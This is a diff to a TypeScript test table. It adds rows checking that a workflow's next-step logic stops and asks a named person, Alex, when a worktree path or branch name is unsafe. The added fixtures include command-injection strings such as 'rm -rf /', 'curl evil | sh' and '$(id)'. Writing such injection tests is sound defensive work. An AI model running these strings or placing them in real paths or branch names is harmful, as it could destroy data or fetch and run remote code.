@@ -52,6 +52,13 @@ const ROWS: readonly [row: number, over: Snapshot, id: StepId, needle: string, a
   [14, snap({ pr: open }), "review", "npm run handoff -- resume 1500 --brief"],
   [15, BASE, "prove", "/r/out/1500-handoff/guards.md"],
   [16, snap({ proverReported: true }), "open-pr", "/r/out/1500-handoff/record.md"],
+  [17, snap({ state: { ...BASE.state!, tree: "/evil; rm -rf /" } }), "stopped", "Ask Alex", "evil"],
+  [18, snap({ state: { ...BASE.state!, tree: "/r/.claude/worktrees/codex-1" } }), "stopped", "Ask Alex", "codex-1 "],
+  [19, snap({ branch: "x; curl evil | sh" }), "stopped", "Ask Alex", "curl"],
+  [20, snap({ branch: "-f" }), "stopped", "Ask Alex", "origin -f"],
+  [21, snap({ branch: "a..b" }), "stopped", "Ask Alex", "a..b"],
+  [22, snap({ branch: "$(id)" }), "stopped", "Ask Alex", "$(id)"],
+  [23, snap({ branch: "x\ny", pr: { number: 9, state: "MERGED" } }), "stopped", "Ask Alex", "worktree remove"],
 ];
 
 test("next names one step for each state of an issue's build, in order (Issue #1409)", () => {
